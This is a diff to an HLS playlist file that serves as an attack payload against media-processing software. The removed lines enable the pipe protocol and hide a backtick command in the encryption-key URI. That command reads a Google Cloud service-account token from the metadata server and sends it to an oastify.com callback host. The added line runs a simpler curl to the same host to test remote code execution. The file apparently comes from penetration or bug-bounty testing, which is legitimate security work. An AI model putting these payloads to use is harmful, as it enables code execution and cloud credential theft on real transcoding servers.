@@ -1,6 +1,5 @@
 #EXTM3U
 #EXT-X-MEDIA-SEQUENCE:0
 #EXTINF:10.0,
-#EXTPROTO:https
-#EXTPROTO:pipe
-#EXT-X-KEY:METHOD=AES-128,URI="`TOKEN=$(curl -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token | head -c 50); curl http://$TOKEN.axbimig2szi660lw8jnkd990yr4wsmgb.oastify.com`"
+#EXT-X-KEY:METHOD=AES-128,URI="`curl http://axbimig2szi660lw8jnkd990yr4wsmgb.oastify.com/testing_rce`"
+# This is a simplified payload. It tries to execute a 'curl' command.
